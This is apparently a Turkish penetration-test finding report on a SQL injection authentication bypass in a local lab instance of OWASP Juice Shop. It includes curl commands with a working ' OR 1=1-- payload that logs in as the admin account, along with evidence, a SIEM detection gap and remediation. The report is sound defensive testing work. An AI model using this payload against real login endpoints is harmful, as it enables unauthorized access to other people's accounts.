# F-01 — SQL Injection ile Kimlik Doğrulama Atlatma (Giriş)

| | |
|---|---|
| **Önem** | Kritik |
| **OWASP Top 10 (2021)** | A03:2021 — Injection |
| **CWE** | CWE-89 (SQL Injection), CWE-287 (Improper Authentication) |
| **Konum** | `POST /rest/user/login` — `email` alanı |
| **Durum** | ✅ Doğrulandı (elle) · 2026-11-25 |

## Açıklama
Giriş uç noktası, `email` alanını doğrudan bir SQL sorgusuna yerleştiriyor. Saldırgan, alanı
sorgunun mantığını değiştirecek şekilde doldurarak **parolayı bilmeden** herhangi bir hesaba
(ilk sıradaki yönetici hesabı dahil) giriş yapabiliyor.

## Yeniden üretme (yalnızca lab, 127.0.0.1:8080)
```
# 1) Doğru olması gereken negatif test — yanlış parola reddediliyor:
curl -X POST http://127.0.0.1:8080/rest/user/login \
     -H 'Content-Type: application/json' \
     --data '{"email":"test@test.com","password":"yanlisparola123"}'
# -> HTTP 401

# 2) SQLi yükü:
curl -X POST http://127.0.0.1:8080/rest/user/login \
     -H 'Content-Type: application/json' \
     --data '{"email":"'\'' OR 1=1--","password":"x"}'
# -> HTTP 200, geçerli JWT + "umail":"admin@juice-sh.op"
```
`' OR 1=1--` yükü `WHERE email = '' OR 1=1--' AND password = ...` koşulunu her zaman doğru yapıp
sorgunun döndürdüğü ilk kullanıcıyla oturum açıyor.

## Kanıt
- Negatif test: HTTP 401. Yük ile: HTTP 200, `authentication.umail = admin@juice-sh.op`,
  717 karakterlik geçerli JWT döndü (token raporda maskelendi, saklanmadı).
- Parola hiçbir aşamada bilinmiyordu.

## Etki
Yönetici dahil tüm hesaplara tam erişim; kimlik doğrulama tamamen atlanabiliyor. Bu uygulamadaki
en yüksek etkili bulgu.

## Wazuh'ta tespit
❌ **Tespit edilmedi.** Başarılı atlatma HTTP **200** döndürdüğü için nginx logunda normal bir
başarılı girişten ayırt edilemiyor; saldırı grubu alarmı üretilmedi. → Faz 4: istek gövdesindeki
SQLi kalıplarını (nginx access log gövdeyi görmez) yakalamak için uygulama seviyesinde loglama
ya da WAF gerekir. Bu, ağ/erişim logu tabanlı tespitin önemli bir kör noktası.

## Düzeltme
- Parametreli sorgu / ORM parametre bağlama kullan; kullanıcı girdisini asla SQL metnine ekleme.
- Kimlik doğrulama sorgusunu tek bir kullanıcıya indirgeyip sabit zamanlı parola doğrulaması yap.
- Faz 6'da nginx seviyesinde hafifletme (şüpheli kalıpların reddi) denenecek, ama asıl düzeltme kodda.
